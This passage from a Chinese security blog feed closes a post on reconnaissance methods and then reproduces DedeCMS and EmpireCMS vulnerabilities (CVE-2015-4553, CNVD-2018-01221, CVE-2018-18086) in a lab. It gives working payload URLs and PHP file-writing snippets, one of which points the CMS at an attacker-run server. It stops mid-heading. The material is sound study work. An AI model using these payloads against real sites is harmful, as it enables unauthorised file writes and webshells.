title="扫描旁站、c段"></a>扫描旁站、c段</h3><p><strong>旁站</strong>指的是，不同的web站点部署在同一台服务器中，在渗透测试的时候，如果目标服务器难以寻找突破点，我们也可以通过旁站入手，寻找弱点，然后再想办法对目标服务器进行跨攻击。例如：通过系统提限、跨目录权限、mysql权限，对目标服务器实施攻击。</p><p><strong>旁站查询</strong>主要是通过各大站长平台，基于对以前的收录信息，通过IP进行分组划分，查找其目标的IP来查询相同IP的解释记录而得出的结果。</p><p><strong>C段</strong>指的并非网络中的C类地址，而是C类地址中子网掩码为255.255.255.0/24中的IP地址段，共254个。对于某些中大型厂商通过有可能使用的是自建的托管机房，他们的业务通常部署在同一个C类地址子网中，这就给了我们可以利用的空间了。</p><p>假如我们能够查询到目标网络的C段IP都是开放的。这时候我们就得找一此比较薄弱的IP来重新进行信息收集工作了。</p><p><a href="https://www.webscan.cc/">同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具 (webscan.cc)</a></p><p><a href="http://www.bug8.me/bing/bing.php">在线旁站查询|C段查询|必应接口C段查询 (bug8.me)</a></p><p><a href="https://dns.aizhan.com/">10.207.96.227属于局域网_IP反查域名_同IP站点查询_同ip网站查询_爱站网 (aizhan.com)</a></p><p><a href="http://s.tool.chinaz.com/same">同IP网站查询，同服务器网站查询 - 站长工具 (chinaz.com)</a></p><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>可能使用了某些cms，或者开源的系统。也可以扫描目录查看是否存在文件泄露</p><p><a href="https://github.com/">GitHub</a>寻找自写系统的源码，关键词，中英文，拼音</p><h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><p>该信息收集方法利用的是基本广大的安全行业从业者对常见web的敏感危险目录/文件形成一个汇总字典，当然也可以结合自己的经验，将文件加入到字典中，增加字典的范围，然后利用该字典向目标web服务器发出请求，显示返回的状态码，然后我们根据状态码进行人工进行判断分析有没有敏感文件可以进行利用。</p><p>响应码判断：如200代表请求成功。403|401代表无权限，但文件/目录是存在的，500代表服务器出错。其它的响应有状态码请同学们到搜索引擎进行搜索相关知识。</p><p>收集敏感目录/文件的主要工具有：DirBuster、御剑后台等</p><p><a href="https://blog.csdn.net/wy_97/article/details/78165051?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160873751516780310127275%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160873751516780310127275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-78165051.nonecase&utm_term=WEB%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8">ctf/web源码泄露及利用办法含工具</a></p><h3 id="识别防火墙"><a href="#识别防火墙" class="headerlink" title="识别防火墙"></a>识别防火墙</h3><p>可以使用kali自带的<code>wafw00f</code></p><p><img src="https://i.loli.net/2021/02/16/ITh7pdmyjLVrwNO.png" alt="输入wafw00f url即可检测"></p><p><code>wafw00f -l</code>列出wafw00f可识别的waf<br><img src="https://i.loli.net/2021/02/16/loROiuZC86Sp5xY.png"></p><h3 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h3><h4 id="AWVS-web弱点扫描"><a href="#AWVS-web弱点扫描" class="headerlink" title="AWVS web弱点扫描"></a>AWVS web弱点扫描</h4><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞，如交叉站点脚本,sql 注入等。在被黑客攻击前扫描购物车，表格、安全区域和其他Web应用程序。75% 的互联网攻击目标是基于Web的应用程序。因为他们时常接触机密数据并且被放置在防火墙之前。</p><p><a href="https://www.acunetix.com/vulnerabilities/">https://www.acunetix.com/vulnerabilities/</a></p><h4 id="Nessus-主机弱点扫描"><a href="#Nessus-主机弱点扫描" class="headerlink" title="Nessus 主机弱点扫描"></a>Nessus 主机弱点扫描</h4><p>Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用Nessus 作为扫描该机构电脑系统的软件。主要针对的是操作系统及操作系统所安装的软件进行漏洞分析，当然也有很多其它附带的功能，例如:web漏洞安全漏洞检测、简单的信息收集。正所谓，专业的人做专业的事，Nessus针对的是操作系统及操作系统所安装的软件进行漏洞分析，因此我们主要的关注点应该在主机漏洞的严重|高|中级别的漏洞，当然Nessus也有误报的情况，这时也需要我们根据其漏洞的编号、信息去进行难。</p><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>whois信息，用来查询域名的IP以及所有者 等信息的传输协议。简单说，whois就是一个用来查询域名 是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、 域名注册商）。</p><p>用户信息、目标名称、社工库、云盘搜索等等</p><p>利用这些信息就可以进行社工啦~</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>emm其实这篇东西就是东拼西凑，大致了解一下各种工具和一些概念，要想融会贯通还需要后续实践<br>形成自然而然的信息收集习惯，并能将收集到的信息利用起来</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>织梦cms、帝国cms的搭建及漏洞复现</title>
      <link href="2021/02/14/%E7%BB%87%E6%A2%A6cms%E4%BB%A5%E5%8F%8A%E5%B8%9D%E5%9B%BDcms%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/02/14/%E7%BB%87%E6%A2%A6cms%E4%BB%A5%E5%8F%8A%E5%B8%9D%E5%9B%BDcms%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里看到phpstudy自带了这织梦cms和帝国cms，可能是比较经典的cms吧</p><p>因此打算安装这两样复现一下漏洞</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先在官网下载源码~</p><p>织梦cms：<a href="http://www.dedecms.com/products/dedecms/downloads/">产 品 / DedeCMS / 软件下载_织梦CMS</a></p><p>帝国cms：<a href="http://www.phome.net/download/">帝国软件 -&gt; 产品下载 (phome.net)</a></p><p>我下载的是这两个：</p><p><img src="https://i.loli.net/2021/02/13/1SHLytuQWisp8PO.png" alt="7FYRZI___K__YW_X_BR0YIS.png"></p><p>具体安装过程很简单，跟着教程走就可以了</p><p>进入安装目录，逐步填写信息即可</p><blockquote><p>安装目录：</p><p>织梦cms：uploads/install</p><p>帝国cms：upload/e/install</p><p>ps:在真实配置的时候是将upload中的源文件复制到服务器目录中。这里我直接解压了~</p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="织梦cms"><a href="#织梦cms" class="headerlink" title="织梦cms"></a>织梦cms</h3><p>dedecms的漏洞很多，比较用的人多了，找洞的人也就多了。</p><p>这里先随便挑两个复现一下</p><p>ps：google hack搜索dedecms搭建的网站：<code>intitle:powered by dedecms</code></p><p><img src="https://i.loli.net/2021/02/14/5scAk7leiI3Qx1j.jpg" alt="google_hack常用语法"></p><h4 id="5-7-SP1远程文件包含漏洞-CVE-2015-4553"><a href="#5-7-SP1远程文件包含漏洞-CVE-2015-4553" class="headerlink" title="5.7-SP1远程文件包含漏洞(CVE-2015-4553)"></a>5.7-SP1远程文件包含漏洞(CVE-2015-4553)</h4><blockquote><p>影响版本：DeDeCMS &lt; 5.7-sp1,包括5.7 sp1版本</p><p>描述：该漏洞存在于/install/index.php中(安装后为index.php.bak)。由于$$符号的使用不当（即可变变量）导致变量覆盖，最终引发远程文件包含漏洞</p><p>修复：将相关变量改为常量定义</p></blockquote><p>织梦cms5.7 sp1：<a href="http://www.downcode.com/downcode/j_12898.shtml">织梦CMS(DedeCMS) v5.7 SP1 UTF8 build20150618 - 源码下载 (downcode.com)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">    <span class="comment">#用foreach遍历数组，每次循环将数组单元的值赋给$_request（以get、post、cookie传入的值）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) $&#123;<span class="variable">$_k</span>&#125; = RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">    <span class="comment">#foreach遍历数组，将当前数组单元的键名赋给$_k，当前数组单元的值赋给$_v。</span></span><br><span class="line">    <span class="comment">#RunMagicQuotes()作为过滤函数存在</span></span><br><span class="line">    <span class="comment">#$$_request：可变变量，以$_request这个变量的值作为变量名</span></span><br><span class="line">    <span class="comment">#$&#123;$_k&#125;：PHP分析双引号中的数据是否含有变量（并解析它的值），当用双引号时,&#123;&#125;用来界定变量的界限。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function _RunMagicQuotes（&amp;$svar）&#123;</span><br><span class="line"><span class="keyword">if</span>（！get_magic_quotes_gpc（））&#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>（is_array（<span class="variable">$svar</span>））&#123;</span><br><span class="line"><span class="keyword">foreach</span>（<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>）<span class="variable">$svar</span>[<span class="variable">$_k</span>] = _RunMagicQuotes（<span class="variable">$_v</span>）；</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>（strlen（<span class="variable">$svar</span>）&gt;<span class="number">0</span>&amp;&amp;preg_match（<span class="string">&#x27;#^（cfg_|GLOBALS|_GET|_POST|_COOKIE）#&#x27;</span>，<span class="variable">$svar</span>））&#123;</span><br><span class="line"><span class="keyword">exit</span>（<span class="string">&#x27;Request var not allow！&#x27;</span>）；</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line"><span class="variable">$svar</span> = addslashes（<span class="variable">$svar</span>）；</span><br><span class="line">        <span class="comment">#使用addslashes（）函数过滤</span></span><br><span class="line">        <span class="comment">#在某些字符前加上了反斜线。: 引号（&#x27;）、双引号（&quot;）、反斜线（\）、 NULL（null 字符）</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$svar</span>；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问安装页面，由于install_lock的存在，无法重新安装：</p><p><img src="https://i.loli.net/2021/02/14/Fm1CsbuBn6LYoZW.png"></p><p>判断原理：定义了变量$insLockfile，利用file_exists()判断install_lock.txt是否存在<br>（取不存在的文件即可使判断条件失效）</p><p><img src="https://i.loli.net/2021/02/14/4J1kzME8CPFAxqH.png"></p><p>由此进行变量覆盖即可绕过上述判断 <code>xxx/uploads/install/index.php?insLockfile=1</code></p><p><img src="https://i.loli.net/2021/02/14/qQlDNRW7B2nJY6k.png"></p><p>后续由于install_lock.txt的存在，使得安装无法连贯，但访问相应的页面还是可以的</p><p>如：<code>xxx/uploads/install/index.php?step=3&amp;insLockfile=1</code>（由此我们可以在后面访问step=11）</p><p><img src="https://i.loli.net/2021/02/14/gG5cka9ZzYQHDRd.png"></p><p>再看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$step</span>==<span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;../data/admin/config_update.php&#x27;</span>);</span><br><span class="line">    <span class="comment">#包含了../data/admin/config_update.php,在其中定义了updateHost和linkHost</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$rmurl</span> = <span class="variable">$updateHost</span>.<span class="string">&quot;dedecms/demodata.<span class="subst">&#123;$s_lang&#125;</span>.txt&quot;</span>;</span><br><span class="line"><span class="comment">#将config_update.php中的UPDATEHOST与dedecms/demodata.&#123;$s_lang&#125;.txt拼接为字符串</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$sql_content</span> = file_get_contents(<span class="variable">$rmurl</span>);</span><br><span class="line">    <span class="comment">#利用file_get_contents()读取$rmurl指代的文件内容</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="variable">$install_demo_name</span>,<span class="string">&#x27;w&#x27;</span>);<span class="comment">#定义变量$fp,打开$install_demo_name指代的文件(w权限)</span></span><br><span class="line"><span class="keyword">if</span>(fwrite(<span class="variable">$fp</span>,<span class="variable">$sql_content</span>))<span class="comment">#将$sql_content写入到$install_demo_name指代的文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&#x27;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$sql_content</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包含的config_update，其中定义了变量updateHost和linkHost</p><p><img src="https://i.loli.net/2021/02/14/Vj3Z1m9YvATG6fu.png"></p><p>利用：</p><p>1.判断语句为if(step==11），须传入step=11；<br>存在install_lock.txt，传入insLockfile=1（取不存在的文件使得判断条件失效）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">xxx&#x2F;uploads&#x2F;install&#x2F;index.php?step&#x3D;11&amp;insLockfile&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png"></p><p>2.updateHost是来自于config_update.php的包含，无法直接将该变量覆盖。<br>故需要借用<code>fopen($install_demo_name,&#39;w&#39;)</code><strong>将config_update.php清空</strong><br>(w权限特质, 文件存在则清空内容再写入)</p><p>构造payload：</p><p>传入<code>$install_demo_name=config_update.php；</code></p><p>而<code>fwrite($fp,$sql_content)</code>的存在会将 <code>$sql_content</code> 写入<code>config_update.php</code></p><p><code>$sql_content</code>是提取<code>$rmurl</code>指代的文件内容写入</p><p><code>file_get_contents</code>读取失败时返回NULL，因此控制<code>$s_lang</code>为不存在的文件名即可使<code>$sql_content</code>= NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">xxx&#x2F;uploads&#x2F;install&#x2F;index.php?step&#x3D;11&amp;insLockfile&#x3D;1&amp;install_demo_name&#x3D;..&#x2F;data&#x2F;admin&#x2F;config_update.php&amp;s_lang&#x3D;hhhhhh</span><br></pre></td></tr></table></figure><p>显示为0kb，显然config_update.php已被清空了</p><p><img src="https://i.loli.net/2021/02/14/PUsAi5xjzIXw1c7.png"></p><p>3.随着config_update.php的清空，参数updateHost变得可控，可以开始远程上传文件了~</p><p>在kali上创建一个dedecms文件夹,然后创建一个demodata.gb2312.txt,写入<code>&lt;?php phpinfo();?&gt;</code> </p><p>然后开启web服务: <code>sudo service apache2 start</code></p><p><img src="https://i.loli.net/2021/02/14/P7RzZ83vpw1kISt.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">xxx&#x2F;uploads&#x2F;install&#x2F;index.php?step&#x3D;11&amp;insLockfile&#x3D;1&amp;install_demo_name&#x3D;..&#x2F;info.php&amp;updateHost&#x3D;目标主机ip</span><br></pre></td></tr></table></figure><p>显示如下画面即成功</p><p><img src="https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png"></p><p>如下</p><p><img src="https://i.loli.net/2021/02/14/DEIowJPlQvh3dyG.png"></p><p>此漏洞根源还是变量覆盖，修复：</p><p>1、可以看看DISCUZ是怎么做的，当发现KEY的第一个字符存在_就不注册变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(‘_COOKIE’, ‘_POST’, ‘_GET’) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span> =&gt; <span class="variable">$_value</span>) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$_key</span>&#123;<span class="number">0</span>&#125; != ‘_’ &amp;&amp; <span class="variable">$$_key</span> = daddslashes(<span class="variable">$_value</span>);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、官方sp2：</p><p>利用define函数构造为常量</p><h4 id="5-7-SP2后台代码执行漏洞-CNVD-2018-01221"><a href="#5-7-SP2后台代码执行漏洞-CNVD-2018-01221" class="headerlink" title="5.7-SP2后台代码执行漏洞(CNVD-2018-01221)"></a>5.7-SP2后台代码执行漏洞(CNVD-2018-01221)</h4><blockquote><p>影响版本：DeDeCMS &lt; 5.7-sp2,包括5.7 sp2版本</p><p>描述：tpl.php中存在代码执行漏洞,可以通过该漏洞在增加新标签中上传木马,获取webshell。<br>利用条件：需要登录后台；后台的账户权限是管理员权限。</p></blockquote><p>1、此处要求具有管理员权限，并登入后台</p><p>2、分析dede/tpl.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;savetagfile&#x27;</span>)</span><br><span class="line">    <span class="comment">#$action必须等于savetagfile才能执行下面代码</span></span><br><span class="line">&#123;</span><br><span class="line">    csrf_check();<span class="comment">#检验csrf，必须添加token进行绕过</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">        <span class="comment">#此处正则匹配：[a-z0-9_-]任意字符(大于1次) + .lib.php 的字符串：xxx.lib.php</span></span><br><span class="line">        <span class="comment">#$filename不符合正则表达则无法进行修改，构造符号正则的$filename即可</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&#x27;文件名不合法，不允许进行操作！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/oxwindow.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    <span class="comment">#传入的路径为include/taglib/filename(常量DEDEINC=include)</span></span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);<span class="comment">#将$content的内容写入$fp代表的路径</span></span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>此处正则匹配：[a-z0-9_-]任意字符(大于1次) + .lib.php 的字符串：xxx.lib.php<br><img src="https://i.loli.net/2021/02/14/rX9lOf3dHRJyiGD.png"></p><p>3、获取token绕过csrf</p><p>查看tpl.php，发现action有很多参数，但仅当action=upload才能获取token</p><p><img src="https://i.loli.net/2021/02/14/hNAKDiyJRT9jeBL.png"></p><p>访问tpl.php?action=upload；查看页面源代码即可获取token</p><p><img src="https://i.loli.net/2021/02/14/82xRVBh3gONomtQ.png"></p><p>4、</p><p>上传参数：<br>(由于dedecms全局变量注册的特性，content变量和filename变量可控，可以直接将content写入xxx.lib.php文件)<br><code>action=savetagfile</code><br><code>token=上面action=upload获取的token</code><br><code>content=要写入的🐎</code><br><code>filename=xxx.lib.php（要匹配正则）</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">dede&#x2F;tpl.php?action&#x3D;savetagfile&amp;token&#x3D;6ef0da020e1836c5401127d2605cb35b&amp;filename&#x3D;info.lib.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>之前查看代码可知传入的路径为include/taglib/$filename</p><p>访问<code>include/taglib/info.lib.php</code>即可</p><p><img src="https://i.loli.net/2021/02/14/dIOG1YUcrPkWjHg.png"></p><p>修复：</p><p>1.禁止此处写入文件。</p><p>2.过滤恶意标签</p><h3 id="帝国cms"><a href="#帝国cms" class="headerlink" title="帝国cms"></a>帝国cms</h3><h4 id="7-5后台getshell-CVE-2018-18086"><a href="#7-5后台getshell-CVE-2018-18086" class="headerlink" title="7.5后台getshell(CVE-2018-18086)"></a>7.5后台getshell(CVE-2018-18086)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">影响版本：帝国CMS(EmpireCMS) &lt;&#x3D; 7.5</span><br><span class="line"></span><br><span class="line">描述：EmpireCMS7.5版本中的&#x2F;e&#x2F;class&#x2F;moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。</span><br></pre></td></tr></table></figure><p>上传任意文件：</p><p>/e/admin/ecmsmod.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入模型</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$enews</span>==<span class="string">&quot;LoadInMod&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">LoadInMod(<span class="variable">$_POST</span>,<span class="variable">$file</span>,<span class="variable">$file_name</span>,<span class="variable">$file_type</span>,<span class="variable">$file_size</span>,<span class="variable">$logininid</span>,<span class="variable">$loginin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看LoadInMod函数（/e/class/moddofun.php）：</p><details>    <summary>LoadInMod函数</summary>    <pre><codes>    function LoadInMod($add,$file,$file_name,$file_type,$file_size,$userid,$username)&#123;    global $empire,$dbtbpre,$ecms_config;    //验证权限    CheckLevel($userid,$username,$classid,"table");    $tbname=RepPostVar(trim($add['tbname']));    if(!$file_name||!$file_size||!$tbname)    &#123;        printerror("EmptyLoadInMod","");    &#125;    //扩展名    $filetype=GetFiletype($file_name);    if($filetype!=".mod")    &#123;        printerror("LoadInModMustmod","");    &#125;    //表名是否已存在    $num=$empire->gettotal("select count(*) as total from &#123;$dbtbpre&#125;enewstable where tbname='$tbname' limit 1");    if($num)    &#123;        printerror("HaveLoadInTb","");    &#125;    //上传文件    $path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";    #使用make_password(10)对时间进行加密最终拼接成为文件名    $cp=@move_uploaded_file($file,$path);    if(!$cp)    &#123;        printerror("EmptyLoadInMod","");    &#125;    DoChmodFile($path);    @include($path);#这里将$path指代的文件包含了，由此可以构造php进行文件操作让他帮我们写shell    UpdateTbDefMod($tid,$tbname,$mid);    //公共变量    TogSaveTxtF(1);    GetConfig(1);//更新缓存    //生成模型表单文件    $modr=$empire->fetch1("select mtemp,qmtemp,cj from &#123;$dbtbpre&#125;enewsmod where mid='$mid'");    ChangeMForm($mid,$tid,$modr[mtemp]);//更新表单    ChangeQmForm($mid,$tid,$modr[qmtemp]);//更新前台表单    ChangeMCj($mid,$tid,$modr[cj]);//采集表单    //删除文件    DelFiletext($path);    //操作日志    insert_dolog("tid=$tid&tb=$tbname<br>mid=$mid");    printerror("LoadInModSuccess","db/ListTable.php".hReturnEcmsHashStrHref2(1));    &#125;    </codes></pre></details><p>关键代码分析如下（因为代码太长了==就截图出来）</p><p><img src="https://i.loli.net/2021/02/14/Hu1JlL5yQcOomKk.png"></p><p>如下</p><p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p><code>&lt;?php file_put_contents(“info.php”,”&lt;?php phpinfo(); ?&gt;”); ?&gt;</code></p><p>上传的文件被包含（被php解析）就会执行以上代码，从而在同目录下创建 <code>info.php</code> (<code>&lt;?php phpinfo(); ?&gt;”); ?&gt;</code>)</p><p>那么来复现一下：</p><p>按照如下操作进入上传页面</p><p><img src="https://i.loli.net/2021/02/14/Igh9rTBwJ16nzDu.png"></p><p><img src="https://i.loli.net/2021/02/14/SI7Vw1JAtyqQhKu.png" alt="上传页面"></p><p>构造一个内容为</p><p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p>或<code>&lt;?php file_put_contents(“info.php”,”&lt;?php phpinfo(); ?&gt;”); ?&gt;</code></p><p>的.mod后缀的文件</p><p><img src="https://i.loli.net/2021/02/14/x17kit5zP9vr8sJ.png" alt="创建文件~"></p><p><img src="https://i.loli.net/2021/02/14/bSVqfcGsriWaKpD.png" alt="导入~"></p><p>可以看到文件成功写入了<br><img src="https://i.loli.net/2021/02/14/bWnH2d4LjRxMgaw.png" alt="成功写入"></p><p>访问即可<br><img src="https://i.loli.net/2021/02/14/o7HhIAsL9CYd6rZ.png"></p><h4 id="7-5-代码注入-CVE-2018-19462"><a href="#7-5-代码注入-CVE-2018-19462" class="headerlink" title="7.5 代码注入(CVE-2018-19462)"></a>7.5 